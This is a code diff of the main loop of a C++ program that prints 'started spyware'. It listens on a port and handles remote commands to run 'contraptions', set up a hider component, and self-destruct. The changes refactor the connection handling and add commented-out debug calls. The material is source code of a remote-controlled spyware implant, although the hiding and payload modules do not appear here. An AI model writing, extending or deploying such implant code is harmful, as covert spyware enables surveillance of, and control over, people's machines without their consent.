@@ -15,28 +15,33 @@
 
 #define DEBUG
 
-void loopIter(Connection& conn, HiderManeger& hiderManeger, ContraptionAdmin& admin);
+void loopIter(std::shared_ptr<Connection> conn, HiderManeger& hiderManeger, ContraptionAdmin& admin);
 
 
 int main() {
     
     std::cerr << "started spyware" << std::endl;
     
-    HiderManeger& hiderManager = HiderManeger::getInstance();
+    HiderManeger& hiderManeger = HiderManeger::getInstance();
+    ContraptionAdmin admin;
+    // admin.segTest();
     Listener listener = Listener(PORT);
-    ContraptionAdmin admin = ContraptionAdmin();
+    // admin.segTest();
 
     bool cont = true;
     while (cont)
     {
-        Connection conn;
+        // admin.segTest();
+        std::shared_ptr<Connection> conn;
         // TODO add error strtegy
         if (listener.acceptConnection(conn) == -1) {
             std::cerr << "listener.acceptConnection(conn) failed" << std::endl;
             sleep(10);
             continue;
         }
-        loopIter(conn, hiderManager, admin);
+        // admin.segTest();
+
+        loopIter(conn, hiderManeger, admin);
         std::cerr << "spyware: compleated loop iter\n";
     }
 
@@ -45,18 +50,22 @@ int main() {
 
 
 
-void loopIter(Connection& conn, HiderManeger& hiderManeger, ContraptionAdmin& admin)
+void loopIter(std::shared_ptr<Connection> conn, HiderManeger& hiderManeger, ContraptionAdmin& admin)
 {
+    // admin.segTest();
     command cmd;
 
-    conn.recvData(sizeof(cmd), (char*)&cmd);
+    conn->recvData(sizeof(cmd), (char*)&cmd);
+    // admin.segTest();
 
     Status stat = DID_NOTHING;
     std::string strRes = "";
+    // admin.segTest();
 
     switch (cmd.fncode)
     {
     case RunContraption:
+        // admin.segTest();
         stat = admin.runContraption(conn, cmd.identifier);
         break;
 
@@ -65,7 +74,7 @@ void loopIter(Connection& conn, HiderManeger& hiderManeger, ContraptionAdmin& ad
         break;
 
     case SUICIDE:
-        conn.sendResponceStruct((responce){.dataLen = 0, .status = SUICIDE_SUCSESS});
+        conn->sendResponceStruct((responce){.dataLen = 0, .status = SUICIDE_SUCSESS});
         std::exit(EXIT_SUCCESS);
     
     case HIDER_SETUP:
@@ -78,6 +87,7 @@ void loopIter(Connection& conn, HiderManeger& hiderManeger, ContraptionAdmin& ad
     }
 
     std::cerr << "Spyware:  Conn: res-" << stat << " response-\n" << strRes << std::endl;
-    conn.sendResponce(stat, strRes);
-    
+    conn->sendResponce(stat, strRes);
+    std::cerr << "responce sent" << std::endl;
+    conn->closeConn();
 }
